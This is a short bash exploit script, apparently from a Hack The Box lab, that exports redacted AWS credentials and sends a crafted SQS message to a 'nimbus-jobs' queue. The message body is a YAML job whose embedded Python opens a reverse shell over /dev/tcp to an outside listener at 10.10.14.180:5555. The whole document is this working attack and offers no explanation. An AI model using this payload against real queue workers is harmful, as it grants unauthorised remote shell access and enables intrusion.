#!/bin/bash
export AWS_ACCESS_KEY_ID=<REDACTED>
export AWS_SECRET_ACCESS_KEY=<REDACTED>
export AWS_SESSION_TOKEN='<REDACTED>'
export AWS_DEFAULT_REGION=us-east-1

MSG='name: pwn
script: |
  import subprocess
  subprocess.call(["bash","-c","bash -i >& /dev/tcp/10.10.14.180/5555 0>&1"])
'

aws --endpoint-url http://aws.nimbus.htb sqs send-message \
  --queue-url http://aws.nimbus.htb/<REDACTED_ACCOUNT_ID>/nimbus-jobs \
  --message-body "$MSG"
